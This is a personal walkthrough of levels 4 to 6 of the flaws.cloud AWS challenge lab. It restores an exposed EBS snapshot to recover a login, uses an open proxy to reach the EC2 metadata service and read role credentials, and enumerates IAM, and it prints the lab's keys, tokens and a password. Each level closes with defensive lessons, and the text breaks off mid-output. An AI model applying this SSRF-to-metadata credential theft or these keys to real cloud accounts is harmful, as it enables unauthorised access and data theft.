[Instagram's Million Dollar Bug](http://www.exfiltrated.com/research-Instagram-RCE.php) is a very exiting story from 2015 where a security researcher found an RCE in ones of Instagram's servers, got in, started to dig around until he found an AWS key-pair in a server configuration file, but the key-pair didn't have any useful permissions. The key-pair had the permission to list all AWS S3 buckets associated with that account. Except he had access to one bucket used for deployment. In the contents of the latest revision he found a `.tar` file containing deploymenet scripts.S3 stores older revisions of the content of the bucket. He downloaded a very old bucket revision and a Vagrant file was included. Inside there was a second key-pair, but this time he hit the jackpot with this one since he can list and read the contents of all buckets. Now he had access to buckets with user data, api keys, SSL certs, everything.

What did Instagram did wrong according to the article? honestly a lot, but in terms of credentials? they didn't revoke old keys.

Always revoke and rotate your secrets periodically and if you suspect they were compromised.

Next up we need to access [this site](http://4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud/), but we don't know the username and password. What we know tho is that the site is hosted in an EC2 instance, and there is a snapshot of that EC2 instance somewhere.

![](assets/flaws_1_level_4_site_login.png)

We need to find that EC2 snapshot, and see if they are any credentials in there or something.

Alright we have access to an AWS account from the last level. Let's see what we got over here. Use this command to get details about the AWS IAM user we are logged in as:

```console
aws --profile flaws sts get-caller-identity
```

**AWS STS** stands for AWS Security Token Service. It is a global service that allows you to create short-term temporary access tokens to sensetive AWS resources without having to create a dedicated IAM identity.

The action `get-caller-identity` is used here because the we don't need a permission to perform it.


```json
{
    "UserId": "AIDAJQ3H5DC3LEG2BKSLC",
    "Account": "975426262029",
    "Arn": "arn:aws:iam::975426262029:user/backup"
}
```

The name of the IAM user we have credentials for is `backup`. So it's safe to assume this account is used for backups, including EC2 snapshot backups hopefully.

Next, let's see if we can list the EC2 snapshots owned by this IAM user.

```
flaws_level_4 ❯ aws ec2 help | grep snapshot
       o copy-snapshot
       o create-snapshot
       o create-snapshots
       o delete-snapshot
       o describe-fast-snapshot-restores
       o describe-import-snapshot-tasks
       o describe-locked-snapshots
       o describe-snapshot-attribute
       o describe-snapshot-tier-status
       o describe-snapshots
       o disable-fast-snapshot-restores
       o disable-snapshot-block-public-access
       o enable-fast-snapshot-restores
       o enable-snapshot-block-public-access
       o get-snapshot-block-public-access-state
       o import-snapshot
       o list-snapshots-in-recycle-bin
       o lock-snapshot
       o modify-snapshot-attribute
       o modify-snapshot-tier
       o reset-snapshot-attribute
       o restore-snapshot-from-recycle-bin
       o restore-snapshot-tier
       o unlock-snapshot
```

The `describe snapshots` looks promising. One thing though, if don't specify the owner user ID, the command will list ALL snapshots available for us including public snapshots (There is a lot of them!), private snapshots we own, and private snapshots we got access to. 

So don't use this command:

```
aws ec2 describe-snapshots
```

Use this one to list the snapshots we own AND we also need to specify the region. We are in the `us-west-2` region:

```
aws ec2 describe-snapshots --owner-id 975426262029 --region us-west-2
```

```json
{
    "Snapshots": [
        {
            "Tags": [
                {
                    "Key": "Name",
                    "Value": "flaws backup 2017.02.27"
                }
            ],
            "StorageTier": "standard",
            "TransferType": "standard",
            "CompletionTime": "2017-02-28T01:37:07+00:00",
            "SnapshotId": "snap-0b49342abd1bdcb89",
            "VolumeId": "vol-04f1c039bc13ea950",
            "State": "completed",
            "StartTime": "2017-02-28T01:35:12+00:00",
            "Progress": "100%",
            "OwnerId": "975426262029",
            "Description": "",
            "VolumeSize": 8,
            "Encrypted": false
        }
    ]
}
```

Found it! But what can we do with this EC2 snapshot? Let's get back to the basics.

When you create an EC2 instance, **by default** an EBS volumes is created for its root filesystem. The reason is persistence. 

Snapshots are **Point-in-time** backups of EBS volumes, stored in S3. Snapshots are used for backuping data, moving EBS volumes across regions, rapid deploymenet of EC2 instances.

We have an EC2 snapshot. We can create a volume from the snapshot to restore the data is contains. For this we need an account with permissions to create volumes and EC2 instances. I'm using my personal AWS account to do this.

But before i do that, there is actually a command to **describe** a volume based on its Volume ID. As we said snapshots are created from EBS volumes, and in the snapshot description above, you can see that there is the `VolumeId` of the source volume `vol-04f1c039bc13ea950`. Here is the command:

```console
aws ec2 describe-volumes --volume-ids vol-04f1c039bc13ea950 --region us-west-2
```

```json
{
    "Volumes": [
        {
            "Iops": 100,
            "VolumeType": "gp2",
            "MultiAttachEnabled": false,
            "Operator": {
                "Managed": false
            },
            "VolumeId": "vol-04f1c039bc13ea950",
            "Size": 8,
            "SnapshotId": "snap-0f23409e560e2f059",
            "AvailabilityZone": "us-west-2a",
            "State": "in-use",
            "CreateTime": "2017-02-12T22:29:24.999000+00:00",
            "Attachments": [
                {
                    "DeleteOnTermination": true,
                    "VolumeId": "vol-04f1c039bc13ea950",
                    "InstanceId": "i-05bef8a081f307783",
                    "Device": "/dev/sda1",
                    "State": "attached",
                    "AttachTime": "2017-02-12T22:29:25+00:00"
                }
            ],
            "Encrypted": false
        }
    ]
}
```

In order to create a volume from a snapshot we need to specify the following:
- Snapshot ID `snap-0b49342abd1bdcb89`
- AZ `us-west-2a`
- Region `us-west-2`

The command is 

```console
aws --profile ahmouden ec2 create-volume --availability-zone us-west-2a --region us-west-2 --snapshot-id snap-0b49342abd1bdcb89
```

```json
{
    "Iops": 100,
    "Tags": [],
    "VolumeType": "gp2",
    "MultiAttachEnabled": false,
    "VolumeId": "vol-0020306b6c9ec1437",
    "Size": 8,
    "SnapshotId": "snap-0b49342abd1bdcb89",
    "AvailabilityZone": "us-west-2a",
    "State": "creating",
    "CreateTime": "2024-12-12T16:36:09+00:00",
    "Encrypted": false
}
```

Since this is my personel account I have access to the AWS Console. I can check if the volume got created. Don't forget to change the region in your AWS Console. 

And it got created successfully!

![](assets/flaws_1_level_4_volume_created.png)

EBS volumes are designed to be attached to an EC2 instance for access. So let's quickly create and EC2 instance so we can access the volume.

One important detail here is the AZ the volume is in. For this volume it is in the `us-west-2a`. This is important because we can't attach a volume to an EC2 instance that are in different AZs.

![](assets/flaws_1_level_4_volume_az.png)

Now let's create an EC2 instance. We can specify the AZ the EC2 instance will be created in in the **Network Setting** options specifically the **Subnet** option. I choose the `us-west-2a` same as the volume.

![](assets/flaws_1_level_4_subnet_choose_az.png)

And now i can attach the volume to the running EC2 instance:

![](assets/flaws_1_level_4_attached_volume.png)

Now I'll SSH into the EC2 instance using an SSH key-pair i created before:

```
flaws_level_4 ❯ chmod 400 flaws_level_4.pem
flaws_level_4 ❯ ssh -i "flaws_level_4.pem" ec2-user@ec2-35-87-124-45.us-west-2.compute.amazonaws.com
The authenticity of host 'ec2-35-87-124-45.us-west-2.compute.amazonaws.com (35.87.124.45)' can't be established.
ED25519 key fingerprint is SHA256:i09Cbpni1A3j7F5WCQalYsH3eeBstIF/tKk+LOQ37KI.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added 'ec2-35-87-124-45.us-west-2.compute.amazonaws.com' (ED25519) to the list of known hosts.
   ,     #_
   ~\_  ####_        Amazon Linux 2023
  ~~  \_#####\
  ~~     \###|
  ~~       \#/ ___   https://aws.amazon.com/linux/amazon-linux-2023
   ~~       V~' '->
    ~~~         /
      ~~._.   _/
         _/ _/
       _/m/'
[ec2-user@ip-172-31-46-169 ~]$ whoami
ec2-user
[ec2-user@ip-172-31-46-169 ~]$
```

Lets list all available block devices:

```
[ec2-user@ip-172-31-46-169 /]$ pwd
/
[ec2-user@ip-172-31-46-169 /]$ lsblk
NAME      MAJ:MIN RM SIZE RO TYPE MOUNTPOINTS
xvda      202:0    0   8G  0 disk
├─xvda1   202:1    0   8G  0 part /
├─xvda127 259:0    0   1M  0 part
└─xvda128 259:1    0  10M  0 part /boot/efi
xvdb      202:16   0   8G  0 disk
└─xvdb1   202:17   0   8G  0 part
[ec2-user@ip-172-31-46-169 /]$
```

Next lets mount the volume `xvdb1` to `/mnt`:

```
[ec2-user@ip-172-31-46-169 /]$ sudo mount /dev/xvdb1 /mnt
[ec2-user@ip-172-31-46-169 /]$ cd /mnt
[ec2-user@ip-172-31-46-169 mnt]$ ll
total 104
drwxr-xr-x.  2 root root  4096 Feb 13  2017 bin
drwxr-xr-x.  3 root root  4096 Feb 22  2017 boot
drwxr-xr-x.  5 root root  4096 Jan 13  2017 dev
drwxr-xr-x. 94 root root  4096 Feb 19  2017 etc
drwxr-xr-x.  3 root root  4096 Feb 12  2017 home
lrwxrwxrwx.  1 root root    32 Feb 22  2017 initrd.img -> boot/initrd.img-4.4.0-64-generic
lrwxrwxrwx.  1 root root    32 Feb 21  2017 initrd.img.old -> boot/initrd.img-4.4.0-63-generic
drwxr-xr-x. 21 root root  4096 Jan 13  2017 lib
drwxr-xr-x.  2 root root  4096 Jan 13  2017 lib64
drwx------.  2 root root 16384 Jan 13  2017 lost+found
drwxr-xr-x.  2 root root  4096 Jan 13  2017 media
drwxr-xr-x.  2 root root  4096 Jan 13  2017 mnt
drwxr-xr-x.  2 root root  4096 Jan 13  2017 opt
drwxr-xr-x.  2 root root  4096 Apr 12  2016 proc
drwx------.  3 root root  4096 Feb 19  2017 root
drwxr-xr-x.  6 root root  4096 Jan 13  2017 run
drwxr-xr-x.  2 root root 12288 Feb 13  2017 sbin
drwxr-xr-x.  2 root root  4096 Jan  3  2017 snap
drwxr-xr-x.  2 root root  4096 Jan 13  2017 srv
drwxr-xr-x.  2 root root  4096 Feb  5  2016 sys
drwxrwxrwt.  8 root root  4096 Feb 28  2017 tmp
drwxr-xr-x. 10 root root  4096 Jan 13  2017 usr
drwxr-xr-x. 14 root root  4096 Feb 12  2017 var
lrwxrwxrwx.  1 root root    29 Feb 22  2017 vmlinuz -> boot/vmlinuz-4.4.0-64-generic
lrwxrwxrwx.  1 root root    29 Feb 21  2017 vmlinuz.old -> boot/vmlinuz-4.4.0-63-generic
[ec2-user@ip-172-31-46-169 mnt]$
```

By default we'll go to the home directory:

```
[ec2-user@ip-172-31-46-169 mnt]$ cd home/ubuntu/
[ec2-user@ip-172-31-46-169 ubuntu]$ ll
total 8
-rw-rw-r--. 1 ec2-user ec2-user 268 Feb 12  2017 meta-data
-rw-r--r--. 1 ec2-user ec2-user  72 Feb 13  2017 setupNginx.sh
[ec2-user@ip-172-31-46-169 ubuntu]$ cat setupNginx.sh
htpasswd -b /etc/nginx/.htpasswd flaws nCP8xigdjpjyiXgJ7nJu7rw5Ro68iE8M
[ec2-user@ip-172-31-46-169 ubuntu]$
```

And we found the crendetials to login to the site:

```
http://4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud/
```

![](assets/flaws_1_level_4_login_with_credentials.png)

![](assets/flaws_1_level_4_logged_in.png)

Snapshots are used to backup EC2's and databases. An like any other asset, they need to be protected since like we seen before they can lead to compromizing credentials and sensitive data. 

## Level 5: Instance MetaData Service (IMDS)

```
http://level5-d2891f604d2061b6977c2481b0c8333e.flaws.cloud/243f422c/
```

Next level is about an EC2 with a simple HTTP proxy in the `/proxy/` endpoint. Here are examples:


- http://4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud/proxy/flaws.cloud/
- http://4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud/proxy/summitroute.com/blog/feed.xml
- http://4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud/proxy/neverssl.com/ 

The goal is to list the contents of the level 6 bucket at:

[http://level6-cc4c404a8a8b876167f5e70a7d8c9880.flaws.cloud/](http://level6-cc4c404a8a8b876167f5e70a7d8c9880.flaws.cloud/)

The bucket has a hidden directory in it. We need to access that.

First thing is to list the bucket. 

Accessing the url directory tells us that we are denied access:

![](assets/flaws_level_5_level_6_bucket_site.png)

First idea i had is to use the proxy to access the bucket:

```
http://4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud/proxy/level6-cc4c404a8a8b876167f5e70a7d8c9880.flaws.cloud/
```

![](assets/flaws_level_5_proxy_to_level_6_access_denied.png)

Same no access.

At first you'd think that we need some type of crendentials to access the bucket, but that is a wrong assumption. We are **already** inside the bucket. We need to access a **sub-directory** in the bucket, but we don't know its **name**. That is why we need to list the contents of the bucket, so we'll learn the name of the sub-directory.

The key to this level resides in [Dynamic Configuration of IPv4 Link-Local Addresses](https://www.rfc-editor.org/rfc/rfc3927), specifically how AWS uses it in the `169.254.169.254` IP address.

In short Link-Local Addresses are IP addresses automatically assigned to devices when no dynamic (DHCP) ir static IP address is available. The IPv4 link-local address range is `169.254.0.0/16`. Only devices on the same physical or logical network segment can communicate with each other using these addresses.

AWS reservered the `169.254.169.254` IP for the **instance metadata service**. Any EC2 instance can go to this IP and ask it for metadata that belong to that instance.

The only condition is to provide an EC2 instance token in the request headers (`"X-aws-ec2-metadata-token: $TOKEN"`) so the metadata service knows what instance it is talking to. For our case we don't need to provide a token because the HTTP proxy already provides one when we are telling it to go to the metadata service.

Edit: That header is actually not needed in IMDSv1, but in IMDSv2. 

Let's access the metadata service through the proxy right now. Those dates don't mean previous backups of metadata (I thought that at first), but they are the available API versions of the **Instance MetaData Service (IMDS)**.

![](assets/flaws_metadata_service_through_proxy.png)

Obviously we'll go with the `latest` API version for the latest capabilities of the API.


```
http://4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud/proxy/169.254.169.254/latest
```

```
dynamic
meta-data
```

`dynamic` is for well **dynamic** metadata that change during runtime. 

`meta-data` is for **static** metadata.

```
http://4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud/proxy/169.254.169.254/latest/meta-data
```

```
ami-id
ami-launch-index
ami-manifest-path
block-device-mapping/
events/
hostname
iam/
identity-credentials/
instance-action
instance-id
instance-life-cycle
instance-type
local-hostname
local-ipv4
mac
metrics/
network/
placement/
profile
public-hostname
public-ipv4
public-keys/
reservation-id
security-groups
services/
system
```

So much information, but I'll go straight to what matters to us to not waste time. Credentials!

We know that EC2 instances are given IAM **roles** for permissions instead of IAM users that belong to actual people. IAM role credentials can be found in the `/latest/meta-data/iam/security-credentials/` endpoint.

This instance assules the `flaws` role. Here is the crendetials:

```
http://4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud/proxy/169.254.169.254/latest/meta-data/iam/security-credentials/flaws
```

```json
{
  "Code" : "Success",
  "LastUpdated" : "2024-12-17T14:49:33Z",
  "Type" : "AWS-HMAC",
  "AccessKeyId" : "ASIA6GG7PSQG56KDQRMA",
  "SecretAccessKey" : "qSx0bb+jctFKvLSrQbEUtcGzxkrIEiAuFGL91oGM",
  "Token" : "IQoJb3JpZ2luX2VjEH8aCXVzLXdlc3QtMiJHMEUCIQDAqEazir625juWXrT6YnRKQ6/zDXpqnpUdO4SSdiYdFAIgRCeajgN/CWcEUsVp9Bp+1676Jb6omwoyIQiEUgftZmAqsgUISBAEGgw5NzU0MjYyNjIwMjkiDF6jXECav6tKbfeRaiqPBR/hBj4Bt7bUJzY947k1uMYYPGYKoo6K9jjOQrLkEROWRcHJmiO8RUj3pIpS3nMgD9oqQeVYO1yNws0M303U8IKfnzWmcIHqW1uW9ahD/N+ZGHG7J3Bhi3nMpKof20n/kEkNSqI71BDqTmZncj4fgnfUEXRq8YLhDWO/YP+vrqQL/WD4QeRO9iiqOH8T70/AaeH9ek5t25M6mHDJGepAJCwqC5ElkiJdqwHEhgJDwOCwx7auO3qBX1wOecYObCEYzFNp6bx3lyWgCZ0sxFFYk+DPwvjvY1eQcAeHgMUMTQRJ1UHmAAYULpkhGCexVsUWIEu5z+5s524wtv26txxlEfPyKhPHdTXHW/MmHcGo+QI77Ckcg1Ytj8ajCNZ8+Jbs5JGChc5r1LTrPG7j0KebEeDK0HEUYgesHXyFOoBkG/fO+hEE1WrZ4FlUQ/88BPShPEOsCs+lNRvVUXmWyDlyfzd0tIq/4ke7/GIDeAH7aFMoxTDy2frRq7DNsKUvVKat2IH1pdEAgU70zYJb2awgup2ci3rWnj+LQh/dctGoymurSDO0zUT4e87N5ZS5WvucCQyDz+b7loD7AJuJs8q5p+xRFK8/a9UVwDaIJv5Y0HHp6bgSMHTmJrh/OrRZ5s2ndIqADjCzPscE3XNdjUL/BtzO/kAKyyYySbRXFGkZBtqTcipDWoT7CvTZmJAL9rLoqAk8nzMwNkU4yWw8UK87cqpEVigd1iWFzvvUXqMl3woiyx+6Jk3rpIF/TtXBmMCbFY7OSQIXQZJvBsHbnywAaOxXgM50Y8wm+qZdtzQbl/Mo94O6CwOEGex0u5s0iLGC+1M06bowu1kA6oygbg/89MawhHdKEneJGoERoeMYQZYwqJ+GuwY6sQFf8TB4nIRdPj3lCPldg7KufB+ZsDspga4MYZiq2X4erJlBFaJqgcr7lKr6TpBYYK7QrmPasIIDXzsOl4eUl0t++h1AEg3s2ls+m61h7maomBG0t1zCAHDENeCdETdhBl5M1y4nMxSDBPK0lbbQZ+dsA6eUu37gtx04CusvI2+HUgs1Ic6FDrNBqeQwHY35WQg/7HWjnQiifomYY9r++0Q7ef0NWy6Yn8yuOvnzCNThC3I=",
  "Expiration" : "2024-12-17T21:18:23Z"
}
```

Great! now how can we use these credentials? We've seen that `aws configure` only wants two keys `Access Key ID` and `Secret Access Key`. But this role has a third crendetial, a `Token`. `aws configure` is designed for IAM users not roles. 

To assume a role in AWS CLI we need to add the three credentials in the `~/.aws/credentials` file. The crendetials are added under a profile.

```powershell
PS C:\Users\Ahmed\.aws> cat .\credentials
[level5]
aws_access_key_id = ASIA6GG7PSQGQHCYCHSK
aws_secret_access_key = szcb/pp0Ux1zksAQGGrghhj6XvcpBThZo58fXxMS
aws_session_token = IQoJb3JpZ2luX2VjEHoaCXVzLXdlc3QtMiJIMEYCIQCCkhXaBuyqFeBy4BHhQcMFBB+y7mmSOd5ldPpgVh8whQIhANjcKsbVRx29MzfFFFdAArEiwzHGyrlcbBjgXtgiv9poKrIFCEMQBBoMOTc1NDI2MjYyMDI5Igw63AhivlWUkaAryaMqjwXNORd1p0bUyk5XrgEB7XED4256s/biGvMsOCoziY0vNrJtmCkuVbAQepSZtpVostyK8xK0AuFN7rAHzM4elWtKvxHuFmdAybgf5LaBzR2yOmjZx3nBQijLozhjFZTFj5a8hBhsynfQMNmPlJnOn+W7M8WXfXI8P7N2rnBIQlwC2g7hNGBTwyhLEGrkxlqc3KC2hSl9XT7yQ3EIxXWOoqUNKMR59QoIgJjltP/JNjlBQ1gUtBT87A0XNObppIiV/amkIy2k+FuqNCKIymAhaP3iZeDSMCo9k+xM7h1OrlzLJyGR5s0BT3k39bZqUDsY+z2eFFCUfs1z+OeSSf/wxehK/Mks1Qu+2pRuQIUW2/oo71dzwLCAmUO/SPosiqSOPH0HxeqZlu2C2KRHbZraTyuw3+GnmK/we+qsF9CmG1RzI62EInR2hBSUKIikxn8+LE1p9mmGkVZ2RHKk3DE/XpgxhYKUwIf1x8Njg5g0yEsfEjs7leIrUsYgwFwgN7nfnjM7EqjQPWs8byUFigzAVYSSlosNdWzzjGDwzVmCNfOX9UY3yE4JHxPenVfhWxZIvozCair5B0JWEyzLdyUOVRxt1d0ImGUf/7453iE7mUIUidSFPmsiZZQii8HBxG1kCXhwKr+JsLd1zSkLDfjBpt+Ng2WknPI8WOwi+Wzmi4NPfhy1xikZAZjAp4zp7K3kqS8g7cK0GTtJ9yTXON91gHWXPsT8Sz1vt1IqHFZBrZt9SKilw6LwH8c0tQOUoZbQg1FjGgNR+c37f/GYHfRtJysgC6nSuEJiCQMNEGTt3Cd/R2YcKULvpe7fs4qwg+aPmq42wMInRSmILWOsDa+aPmA7fTOVTW5qhSBJBdaf9Br/MJqYhbsGOrABShc/I2xiaT1XV/7tjCPQrc2o3ygT9rNxxvNH3AZ0SSn9MWi7AqrWE98/ThMYl2+043fsm1SK84kgEUfw0ORbzYBxSd7HUDuGKgtTYzmU1qAjmA7QaAT6NjbXEGSlycoznj/6ZA+WPNk2mIugUmqp5YSYSbjOSiKKv2VHE5tufPFTiXWu0tT2wJ8111gOkgV2YVM8tmU/0KMjTElpUZ7QuNo89EYx8EwGm6HpxxHQfb4=
```

Let's use the role to list the contents of all S3 buckets.

```
aws --profile level5 s3 ls
```

```powershell
PS C:\Users\Ahmed> aws --profile level5 s3 ls

An error occurred (AccessDenied) when calling the ListBuckets operation: User: arn:aws:sts::975426262029:assumed-role/flaws/i-05bef8a081f307783 is not authorized to perform: s3:ListAllMyBuckets because no identity-based policy allows the s3:ListAllMyBuckets action
```

And we don't have the permissions to do that action. Let's list the contents of the bucket we actually know of, the level6 bucket:

```
level6-cc4c404a8a8b876167f5e70a7d8c9880.flaws.cloud
```

```
aws --profile level5 s3 ls s3://level6-cc4c404a8a8b876167f5e70a7d8c9880.flaws.cloud
```

```powershell
PS C:\Users\Ahmed> aws --profile level5 s3 ls s3://level6-cc4c404a8a8b876167f5e70a7d8c9880.flaws.cloud
                           PRE ddcc78ff/
2017-02-27 03:11:07        871 index.html
```

Nice! Let's list the contents of the sub-directory `ddcc78ff/`. Don't forget the `--recursive` switch

```
aws --profile level5 s3 ls s3://level6-cc4c404a8a8b876167f5e70a7d8c9880.flaws.cloud/ddcc78ff/ --recursive
```

```
PS C:\Users\Ahmed> aws --profile level5 s3 ls s3://level6-cc4c404a8a8b876167f5e70a7d8c9880.flaws.cloud/ddcc78ff/ --recursive
2017-03-03 05:36:23       2463 ddcc78ff/hint1.html
2017-03-03 05:36:23       2080 ddcc78ff/hint2.html
2020-05-22 19:42:20       2924 ddcc78ff/index.html
```


We have what we need now, the name of the sub-directory. Let's access it:

```
level6-cc4c404a8a8b876167f5e70a7d8c9880.flaws.cloud/ddcc78ff/
```

We made it!

![](assets/flaws_level_6_site.png)

Alright now for the learnings. IMDS is a really useful service that can be used in multipale cases, but it also holds sensitive information that should be protected from malicious users and threat actors. 

IMDSv2 is more secure than v1 because it requires a security token and other protections and it should be used instead of the v1.

Applications running on EC2 instances should not be able to access the IMDS service at the `169.254.169.254` IP address or any local or private IP ranges.

Also IAM roles need to be locked down as tight as possible (**least privilege principle at play here**) because it was because of the EC2 `flaws` role that we got access to the level 6 S3 bucket.

## Level 6: APIs and Lambda Functions

```
http://level6-cc4c404a8a8b876167f5e70a7d8c9880.flaws.cloud/ddcc78ff/
```

The final challenge. 

For this challenge we got ourselves some credentials to a IAM user that has `SecurityAudit` policy attached to it. The goal here is to see what we can find out in the account.

The crendentails:

```
Access key ID: AKIAJFQ6E7BY57Q3OBGA
Secret: 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
```

Added as an AWS profile

```
[level6]
aws_access_key_id = AKIAJFQ6E7BY57Q3OBGA
aws_secret_access_key = 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
```

Let's get the identity information

```json
PS C:\Users\Ahmed> aws --profile level6 sts get-caller-identity
{
    "UserId": "AIDAIRMDOSCWGLCDWOG6A",
    "Account": "975426262029",
    "Arn": "arn:aws:iam::975426262029:user/Level6"
}
```

Let's list the s3 buckets

```
PS C:\Users\Ahmed> aws --profile level6 s3 ls
2017-02-12 22:31:07 2f4e53154c0a7fd086a04a12a452c2a4caed8da0.flaws.cloud
2017-05-29 17:34:53 config-bucket-975426262029
2017-02-12 21:03:24 flaws-logs
2017-02-05 04:40:07 flaws.cloud
2017-02-24 02:54:13 level2-c8b217a33fcf1f839f6f1f73a00a9ae7.flaws.cloud
2017-02-26 19:15:44 level3-9afd3927f195e10225021a578e6f78df.flaws.cloud
2017-02-26 19:16:06 level4-1156739cfb264ced6de514971a4bef68.flaws.cloud
2017-02-26 20:44:51 level5-d2891f604d2061b6977c2481b0c8333e.flaws.cloud
2017-02-26 20:47:58 level6-cc4c404a8a8b876167f5e70a7d8c9880.flaws.cloud
2017-02-26 21:06:32 theend-797237e8ada164bf9f12cebf93b282cf.flaws.cloud
```

I see the last bucket:

```
theend-797237e8ada164bf9f12cebf93b282cf.flaws.cloud
```

And we need the sub-directory name again:

![](assets/flaws_level_end_site_need_subdirectory_name.png)

We can't list the s3 bucket contents:

```
PS C:\Users\Ahmed> aws --profile level6 s3 ls s3://theend-797237e8ada164bf9f12cebf93b282cf.flaws.cloud

An error occurred (AccessDenied) when calling the ListObjectsV2 operation: User: arn:aws:iam::975426262029:user/Level6 is not authorized to perform: s3:ListBucket on resource: "arn:aws:s3:::theend-797237e8ada164bf9f12cebf93b282cf.flaws.cloud" because no identity-based policy allows the s3:ListBucket action
```

We should take a look now on the `SecurityAudit` **AWS Managed Policy**. You can find it in this [link](https://docs.aws.amazon.com/aws-managed-policy/latest/reference/SecurityAudit.html). Basically this policy grants access to read security configuration metadata that audit software typically needs to perform an audit on the aws account.

I guess the most important thing to do is enumerating our identity and access rights, AKA `iam`.

In the policy we are allowed these actions:

```json
{
    --SNIP--
    "iam:GenerateCredentialReport",
    "iam:GenerateServiceLastAccessedDetails",
    "iam:Get*",
    "iam:List*",
    --SNIP--
}
```

Entering this invalid command prompts aws cli to give a list of valid commands

```ps
PS C:\Users\Ahmed> aws --profile level6 --region us-west-2 iam get-
```

```ps
add-client-id-to-open-id-connect-provider | add-role-to-instance-profile
add-user-to-group                        | attach-group-policy
attach-role-policy                       | attach-user-policy
change-password                          | create-access-key
create-account-alias                     | create-group
create-instance-profile                  | create-login-profile
create-open-id-connect-provider          | create-policy
create-policy-version                    | create-role
create-saml-provider                     | create-service-linked-role
create-service-specific-credential       | create-user
create-virtual-mfa-device                | deactivate-mfa-device
delete-access-key                        | delete-account-alias
delete-account-password-policy           | delete-group
delete-group-policy                      | delete-instance-profile
delete-login-profile                     | delete-open-id-connect-provider
delete-policy                            | delete-policy-version
delete-role                              | delete-role-permissions-boundary
delete-role-policy                       | delete-saml-provider
delete-ssh-public-key                    | delete-server-certificate
delete-service-linked-role               | delete-service-specific-credential
delete-signing-certificate               | delete-user
delete-user-permissions-boundary         | delete-user-policy
delete-virtual-mfa-device                | detach-group-policy
detach-role-policy                       | detach-user-policy
disable-organizations-root-credentials-management | disable-organizations-root-sessions
enable-mfa-device                        | enable-organizations-root-credentials-management
enable-organizations-root-sessions       | generate-credential-report
generate-organizations-access-report     | generate-service-last-accessed-details
get-access-key-last-used                 | get-account-authorization-details
get-account-password-policy              | get-account-summary
get-context-keys-for-custom-policy       | get-context-keys-for-principal-policy
get-credential-report                    | get-group
get-group-policy                         | get-instance-profile
get-login-profile                        | get-mfa-device
get-open-id-connect-provider             | get-organizations-access-report
get-policy                               | get-policy-version
get-role                                 | get-role-policy
get-saml-provider                        | get-ssh-public-key
get-server-certificate                   | get-service-last-accessed-details
get-service-last-accessed-details-with-entities | get-service-linked-role-deletion-status
get-user                                 | get-user-policy
list-access-keys                         | list-account-aliases
list-attached-group-policies             | list-attached-role-policies
list-attached-user-policies              | list-entities-for-policy
list-group-policies                      | list-groups
list-groups-for-user                     | list-instance-profile-tags
list-instance-profiles                   | list-instance-profiles-for-role
list-mfa-device-tags                     | list-mfa-devices
list-open-id-connect-provider-tags       | list-open-id-connect-providers
list-organizations-features              | list-policies
list-policies-granting-service-access    | list-policy-tags
list-policy-versions                     | list-role-policies
list-role-tags                           | list-roles
list-saml-provider-tags                  | list-saml-providers
list-ssh-public-keys                     | list-server-certificate-tags
list-server-certificates                 | list-service-specific-credentials
list-signing-certificates                | list-user-policies
list-user-tags                           | list-users
list-virtual-mfa-devices                 | put-group-policy
put-role-permissions-boundary            | put-role-policy
put-user-permissions-boundary            | put-user-policy
remove-client-id-from-open-id-connect-provider | remove-role-from-instance-profile
remove-user-from-group                   | reset-service-specific-credential
resync-mfa-device                        | set-default-policy-version
set-security-token-service-preferences   | simulate-custom-policy
simulate-principal-policy                | tag-instance-profile
tag-mfa-device                           | tag-open-id-connect-provider
tag-policy                               | tag-role
tag-saml-provider                        | tag-server-certificate
tag-user                                 | untag-instance-profile
untag-mfa-device                         | untag-open-id-connect-provider
untag-policy                             | untag-role
untag-saml-provider                      | untag-server-certificate
untag-user                               | update-access-key
update-account-password-policy           | update-assume-role-policy
update-group                             | update-login-profile
update-open-id-connect-provider-thumbprint | update-role
update-role-description                  | update-saml-provider
update-ssh-public-key                    | update-server-certificate
update-service-specific-credential       | update-signing-certificate
update-user                              | upload-ssh-public-key
upload-server-certificate                | upload-signing-certificate
wizard                                   | wait
```

I'm interested in the `Get-*` and `list-*` commands for now:

```ps
get-access-key-last-used                 | get-account-authorization-details
get-account-password-policy              | get-account-summary
get-context-keys-for-custom-policy       | get-context-keys-for-principal-policy
get-credential-report                    | get-group
get-group-policy                         | get-instance-profile
get-login-profile                        | get-mfa-device
get-open-id-connect-provider             | get-organizations-access-report
get-policy                               | get-policy-version
get-role                                 | get-role-policy
get-saml-provider                        | get-ssh-public-key
get-server-certificate                   | get-service-last-accessed-details
get-service-last-accessed-details-with-entities | get-service-linked-role-deletion-status
get-user                                 | get-user-policy
list-access-keys                         | list-account-aliases
list-attached-group-policies             | list-attached-role-policies
list-attached-user-policies              | list-entities-for-policy
list-group-policies                      | list-groups
list-groups-for-user                     | list-instance-profile-tags
list-instance-profiles                   | list-instance-profiles-for-role
list-mfa-device-tags                     | list-mfa-devices
list-open-id-connect-provider-tags       | list-open-id-connect-providers
list-organizations-features              | list-policies
list-policies-granting-service-access    | list-policy-tags
list-policy-versions                     | list-role-policies
list-role-tags                           | list-roles
list-saml-provider-tags                  | list-saml-providers
list-ssh-public-keys                     | list-server-certificate-tags
list-server-certificates                 | list-service-specific-credentials
list-signing-certificates                | list-user-policies
list-user-tags                           | list-users
```

Let's start with some user information

```ps
PS C:\Users\Ahmed> aws --profile level6 --region us-west-2 iam get-user
{
    "User": {
        "Path": "/",
        "UserName": "Level6",
        "UserId": "AIDAIRMDOSCWGLCDWOG6A",
        "Arn": "arn:aws:iam::975426262029:user/Level6",
        "CreateDate": "2017-02-26T23:11:16+00:00"
    }
}
```

Let's list the users

```ps
PS C:\Users\Ahmed\flaws\level6> aws --profile level6 --region us-west-2 iam list-users
    "Users": [
        {
            "Path": "/",
            "UserName": "backup",
            "Arn": "arn:aws:iam::975426262029:user/backup",
            "CreateDate": "2017-02-12T20:58:26+00:00"
        },
        {
            "Path": "/",
            "UserName": "Level6",
